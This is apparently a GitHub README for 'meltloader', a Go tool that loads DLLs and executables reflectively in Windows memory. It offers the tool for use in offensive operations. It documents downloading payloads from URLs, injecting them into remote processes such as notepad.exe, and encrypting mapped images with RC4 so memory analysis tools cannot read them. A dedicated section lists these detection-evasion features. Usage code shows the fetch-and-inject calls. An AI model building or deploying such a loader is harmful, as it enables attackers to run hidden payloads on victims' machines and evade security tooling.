# meltloader

a reflective dll/pe loader for windows written in go that performs pe loading entirely in memory with automatic memory management and encryption features.

## demo
>now supports PEs
![melt](https://github.com/user-attachments/assets/819639da-32ca-4393-8945-0e4c0b8145d6)

## overview

meltload implements reflective dll/pe loading using windows nt api calls to allocate, write, and execute pe files without touching disk. the loader handles pe parsing, relocation processing, import resolution, and memory protection changes while providing tracking and cleanup capabilities. this should allow you to chain an arbitrary amount of DLLs that perform various operations in a modular and secure manner :3

the loader uses windows' provided SystemFunction032 rc4 encryption for evasion purposes. downloaded dlls are always encrypted in memory with an optional sleep period before decryption and execution, and after execution the mapped dll image gets encrypted in place using a randomly generated key. this makes the loaded dll unreadable to memory analysis tools while maintaining proper cleanup functionality.

## https requirement

LoadDLLFromURL requires https connections as winhttp in all my implementations failed with non https and i cba to look at microsoft docs any longer for function signature and type converting windows stuff to go.

## go dll compatibility

also works with go compiled dlls, see go-dll-src/ for reference 

## api usage

```go
// load dll from file
mapping, err := pe.LoadDLLFromFile("path/to/dll.dll", "ExportedFunction")

// load dll from url with optional sleep before encrypt/decrypt finishes
mapping, err := pe.LoadDLLFromURL("https://example.com/dll.dll", "ExportedFunction", 5)

// load dll from url without sleep before encrypt/decrypt finishes
mapping, err := pe.LoadDLLFromURL("https://example.com/dll.dll", "ExportedFunction")

pid, pHandle, err := pe.FindTargetProcess("notepad.exe")
if err != nil {
	log.Printf("[main] failed to find process: %v", err)
	fmt.Println("failed to find process", err)
	return
}
buff, err := net.DownloadToMemory("https://url.com/file.dll")
if err != nil {
	log.Printf("[main] failed to download DLL: %v", err)
	fmt.Println("failed to download", err)
	return
}
_, err = pe.LoadDLLRemote(pHandle, buff, "ExportedFunction")
if err != nil {
	log.Printf("[main] LoadDLLRemote failed: %v", err)
	fmt.Println("failed to load", err)
	return
}
log.Printf("[main] LoadDLLRemote succeeded")

// check currently mapped dlls
baseAddrs, sizes, count := pe.GetMap()
fmt.Printf("currently have %d PEs mapped:\n", count)
for i := 0; i < count; i++ {
	fmt.Printf("PE %d: Base=0x%X, Size=%d bytes\n", i, baseAddrs[i], sizes[i])
}

// cleanup/unmap dll from memory
err = pe.Melt(mapping)

// cleanup/ummap exe from memory 
err = pe.MeltPE(mapping)
```

## function identifier interface

the functionIdentifier parameter accepts multiple types:

- string: function name for named exports ("MessageBoxA")
- int: ordinal number for ordinal exports 
- string containing number: automatically parsed as ordinal ("123")

if no specific function is found, the loader will execute the dll's entry point with DLL_PROCESS_ATTACH.

## technical implementation

the loader performs standard reflective dll loading steps:

pe validation checks dos and nt headers for proper signatures and offsets. memory allocation uses NtAllocateVirtualMemory attempting preferred base address first, falling back to system-chosen addresses. section mapping copies pe headers and each section to their virtual addresses using NtWriteVirtualMemory.

relocation processing handles base address changes by parsing the relocation table and updating all absolute addresses. only IMAGE_REL_BASED_DIR64 relocations are processed for 64-bit compatibility. import resolution walks the import table, loads required libraries with LoadLibraryW, and resolves function addresses with GetProcAddress.

memory protection changes from PAGE_READWRITE to PAGE_EXECUTE_READ using NtProtectVirtualMemory after dll loading completes. export resolution searches the export table by name or ordinal to find the target function.

the encryption system generates a random 32-byte rc4 key during loading. a deferred function encrypts the mapped dll memory in place after execution completes. the encryption key gets securely wiped from memory after use.

memory tracking maintains a global registry of loaded dlls protected by read-write mutex. each mapping stores base address and size information. the Melt function uses VirtualFree with MEM_RELEASE flag and automatically removes entries from the tracking registry. this is opsec iffy, but DLL 0: Base=0x19065C10000, Size=32768 bytes is all that shows up to memory scanners, can also optionally be encrypted when unused if you want to adapt this further

## evasion features

the loader includes several evasion mechanisms. downloaded dlls are always encrypted in memory with an optional time period before decryption and execution. mapped dlls get encrypted in place after execution using rc4 with random keys. memory operations use nt api calls instead of higher level win32 apis. all allocations and operations happen entirely in memory without disk artifacts. the tracking system allows complete cleanup of loaded dlls, removing them from our process memory.
